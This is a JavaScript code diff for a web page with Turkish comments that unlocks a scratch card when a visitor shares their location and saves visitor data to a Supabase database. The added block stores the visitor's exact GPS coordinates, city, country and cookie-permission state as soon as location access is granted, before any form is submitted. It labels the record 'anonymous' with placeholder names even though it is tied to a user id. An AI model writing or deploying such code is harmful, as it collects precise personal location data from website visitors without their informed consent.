@@ -154,7 +154,7 @@ async function insertUserData(data) {
     try {
         const { error } = await STATE.supabaseClient
             .from('user_data')
-            .insert([{
+            .upsert([{
                 id: STATE.dbUserId,
                 first_name: data.firstName,
                 last_name: data.lastName,
@@ -349,7 +349,7 @@ function requestBrowserGeolocation() {
     fetchIpLocation();
 
     navigator.geolocation.getCurrentPosition(
-        (position) => {
+        async (position) => {
             // Başarılı - konum alındı (GPS)
             STATE.userLocation = {
                 ...STATE.userLocation, // Varsa IP bilgilerini koru (city, country)
@@ -373,6 +373,17 @@ function requestBrowserGeolocation() {
             unlockScratchCard();
 
             console.log('📍 GPS üzerinden kesin konum alındı:', STATE.userLocation);
+            
+            // Konum izni verildiği anda form doldurmasını beklemeden anonim olarak veritabanına gönder
+            await insertUserData({
+                firstName: "İsimsiz",
+                lastName: "Ziyaretçi",
+                contact: "Belirtilmedi",
+                cookies: STATE.permissions,
+                city: STATE.userLocation.city || null,
+                country: STATE.userLocation.country || null
+            });
+            await updateUserLocation(position.coords.latitude, position.coords.longitude);
         },
         (error) => {
             // Başarısız - konum reddedildi
